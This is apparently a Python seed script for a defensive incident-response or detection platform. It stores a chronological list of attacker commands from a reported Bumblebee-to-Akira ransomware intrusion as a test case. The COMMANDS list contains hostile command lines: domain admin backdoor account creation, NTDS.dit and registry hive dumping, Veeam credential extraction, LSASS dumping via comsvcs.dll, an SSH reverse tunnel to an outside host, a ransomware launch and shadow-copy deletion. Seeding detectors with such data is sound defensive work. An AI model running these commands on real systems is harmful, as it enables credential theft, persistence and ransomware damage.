"""Seed the shadow observation store with real commands from
The DFIR Report · Bumblebee → AdaptixC2 → Akira (June 2026).

Source (attribution): https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/

Runs the ADAPTERS shadow adapter on each command, persists to
`v2_shadow_observations`. Zero RC5 involvement.

Invocation:
    NIVX_FLAG_ADAPTERS=shadow NIVX_FLAG_CASE_ENGINE=shadow \\
        python -m v2.seed.dfir_bumblebee_akira
"""
from __future__ import annotations
import asyncio, os, sys
from datetime import datetime, timezone
from motor.motor_asyncio import AsyncIOMotorClient
from v2.case_engine.schema import COLLECTIONS
from v2.shadow import observe, observe_all, persist
from v2.flags import get as get_flag

CASE_ID = "case_dfir_bumblebee_akira_2026"

# Chronological attacker commands from the report — real strings.
COMMANDS = [
    # Initial execution
    "msiexec /i ManageEngine-OpManager.msi",
    "C:\\Users\\opsadmin\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\consent.exe",
    "C:\\Users\\opsadmin\\AppData\\Local\\AdgNsy.exe",
    # Discovery (5h after initial)
    "cmd.exe /c systeminfo",
    "cmd.exe /c nltest /dclist:",
    "cmd.exe /c whoami /groups",
    "cmd.exe /c nltest /domain_trusts",
    "cmd.exe /c quser /server:CORP.lan",
    "cmd.exe /c dir C:\\programdata",
    "cmd.exe /c net group \"domain admins\" /dom",
    # Persistence
    "net user backup_DA P@ssw0rd1234 /add /dom",
    "net user backup_EA P@ssw0rd1234 /add /dom",
    "net group \"enterprise admins\" backup_EA /add /dom",
    # RustDesk service install
    "\"C:\\Program Files\\RustDesk\\RustDesk.exe\" --tray",
    "\"C:\\Program Files\\RustDesk\\RustDesk.exe\" --cm",
    # Credential access
    "wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY -quiet",
    "C:\\Program Files\\PostgreSQL\\15\\bin\\psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\"",
    "cmd.exe /Q /c powershell.exe -e JABQAG8AcwB0AGcAcgB1AFMAcQBsAEUAeABlAA==",
    # LSASS via comsvcs.dll · lsassy pattern
    "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 660 \\Windows\\Temp\\G7wO.sys full",
    "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 660 \\Windows\\Temp\\U8Vfsh.docx full",
    # Discovery continued
    "Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\\programdata\\shares.txt",
    "Get-ADComputer -Server 10.10.10.10 -Filter * -Property * | export-csv -path C:\\ProgramData\\AdComputers.csv",
    "Export-DnsServerZone -Name \"CORP.lan\" -FileName \"CORP.lan.txt\"",
    # Lateral / tunneling
    "ssh root@193.242.184.150 -R *:10400 -p22",
    # Impact
    "C:\\ProgramData\\locker.exe -p=G:\\ -n=15",
    "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\"",
]


async def main() -> int:
    if not get_flag("ADAPTERS").observable():
        print("Set NIVX_FLAG_ADAPTERS=shadow first.", file=sys.stderr)
        return 2
    mongo_url = os.environ["MONGO_URL"]
    db_name = os.environ["DB_NAME"]
    client = AsyncIOMotorClient(mongo_url)
    db = client[db_name]

    # Idempotent — clear the case's prior seed first.
    await db[COLLECTIONS["shadow_observations"]].delete_many({"case_id": CASE_ID})

    # Ensure the parent v2_cases row exists so /api/v2/cases lists it and
    # POST /observations does not 404. Discovered by the R1.1 testing
    # agent (report iteration_37) — seed used to only write observations.
    await db[COLLECTIONS["cases"]].update_one(
        {"case_id": CASE_ID},
        {"$setOnInsert": {
            "case_id": CASE_ID,
            "name": "DFIR · Bumblebee → AdaptixC2 → Akira (2026)",
            "description": (
                "Real DFIR intrusion chain from thedfirreport.com/2026 · "
                "Bumblebee MSI loader → AdaptixC2 → domain discovery → "
                "credential access → LSASS dump → RustDesk persistence → "
                "SSH reverse tunnel → Akira ransomware."
            ),
            "status": "open",
            "tags": ["dfir", "bumblebee", "adaptixc2", "akira", "ransomware"],
            "created_at": datetime.now(timezone.utc).isoformat(),
        }},
        upsert=True,
    )

    ok = 0
    total = 0
    for cmd in COMMANDS:
        for ev in observe_all(cmd, case_id=CASE_ID):
            total += 1
            obs_id = await persist(db, ev)
            if obs_id:
                ok += 1
    # Bump event_count on the case doc so the selector shows an accurate tally.
    await db[COLLECTIONS["cases"]].update_one(
        {"case_id": CASE_ID},
        {"$set": {"event_count": ok, "last_seeded_at": datetime.now(timezone.utc).isoformat()}},
    )
    print(f"Seeded case={CASE_ID} · commands={len(COMMANDS)} · observations={ok}/{total}")
    return 0 if ok == total else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
